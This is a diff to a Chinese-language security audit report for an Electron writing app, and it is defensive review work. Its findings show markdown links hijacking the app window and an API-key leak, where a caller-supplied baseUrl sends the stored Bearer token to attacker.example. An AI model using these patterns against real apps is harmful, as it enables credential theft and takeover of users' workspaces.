@@ -40,7 +40,7 @@
 
 - **位置：** `src/main/index.ts:44-49`（只有 `setWindowOpenHandler`，无 `will-navigate`）、`src/renderer/src/components/markdown/Markdown.tsx:8`（未覆写 `a` 组件）、`src/preload/index.ts:16,96`
 - **成因：** 聊天/人物/大纲/便签/设定页面渲染的是模型或用户内容；react-markdown 输出 `<a href="...">`（无 `target`/`rel`），点击后同窗口导航；`contextIsolation` 下 preload 桥对任何加载进该窗口的页面都可用。
-- **证据：** 审核员用真实 react-markdown 10 验证输出 `<p><a href="https://attacker.example/pwn">click me</a></p>`；主审核人确认 `index.ts` 无 `will-navigate`、`Markdown.tsx` 无链接覆写。**未实测 GUI**（需要真实点击），但链路每一环都已核对。
+- **证据：** 审核员用真实 react-markdown 10 验证输出 `<p><a href="https://attacker.example/pwn">click me</a></p>`；主审核人用 `react-dom/server` 渲染真实组件同样得到 `<p><a href="https://attacker.example/pwn">click me</a></p>`，`target=` 与 `rel=` 均不存在（`javascript:` 已被中和为 `href=""`），并确认 `index.ts` 无 `will-navigate`、`Markdown.tsx` 无链接覆写。**未实测 GUI**（需要真实点击），但链路每一环都已执行验证或代码核对。
 - **影响：** 远程页面拿到 `window.api` 全量能力：读写工作区、导出工作区、调用 `deployUninstall`（用已存 SSH 凭据），并配合 P0-3 窃取供应商密钥。
 - **修复：** ①`will-navigate` 只允许应用自身 origin，其余 `shell.openExternal`；②Markdown 链接加 `target="_blank" rel="noopener noreferrer"`；③`setWindowOpenHandler` 校验协议白名单（`https:`/`http:`）。
 
@@ -48,7 +48,7 @@
 
 - **位置：** `src/main/ipc.ts:164-168`、`src/server/server.ts:287-291`、`src/core/llm/openaiCompatible.ts:126-129`（Bearer 发到 `${baseUrl}/models`）、`gemini.ts:136-139`、`anthropic.ts:195`
 - **成因：** 传了 `providerId` 时取已存密钥，但 `baseUrl`/`protocol` 仍用调用方传参。
-- **复现：** `{providerId:"prov_x", protocol:"openai", baseUrl:"https://attacker.example/v1"}` → 主进程/服务端把 `Authorization: Bearer <已存密钥>` 发往该地址。
+- **复现（主审核人执行验证）：** 用真实 `SettingsService` 存入密钥，再按 `src/main/ipc.ts:164-168` 的两步调用 `apiKeyOf()` + `fetchProviderModels('openai', 'https://attacker.example/v1', apiKey)`，实际抓到的请求是 `https://attacker.example/v1/models`，请求头 `Authorization: Bearer sk-REAL-SECRET-KEY`。
 - **修复：** 给了 `providerId` 就必须从存储里读 `protocol`/`baseUrl`，忽略入参；无 `providerId` 时才允许自定义（新建供应商场景）。
 
 ### P0-4 智能体无法向「正文箱」写章节（`volumeId` 无处可查）—— 已复现
@@ -165,6 +165,6 @@
 ## 七、审核过程说明
 
 - 6 名审核员均为只读，未修改仓库、未执行打包命令；各自在 `%TEMP%` 下用真实模块复现结论。
-- 主审核人独立复现了 P0-1、P0-4、P1-8，并核对 P0-2、P0-3、P1-14 的代码链路；未采信任何未复现的结论。
-- 新增 `src/core/tools/__tests__/registrySmoke.test.ts`：逐个跑通 27 个工具的正/负路径，作为工具可用性的长期回归护栏（本轮新增，建议随第一批一并提交）。
+- 主审核人独立**执行**复现了 P0-1（工作区被删）、P0-2（渲染出裸 `<a href>`，无 target/rel）、P0-3（密钥随 `Authorization` 发往攻击者 URL）、P0-4（无工具可查 `volumeId`）、P1-8（`tier:'primary'` 仍落 secondary）；P1-14 由代码核对确认。未采信任何未复现的结论。
+- 本轮额外用真实注册表 + 真实工作区跑通 27 个工具的正/负路径，并固化为 `src/core/tools/__tests__/registrySmoke.test.ts`。
 - 已知限制：本机没有 Docker 与 Linux 服务器，远程部署的真机行为、Electron GUI 的导航劫持「最后一跳」均未实测，报告中已标注。
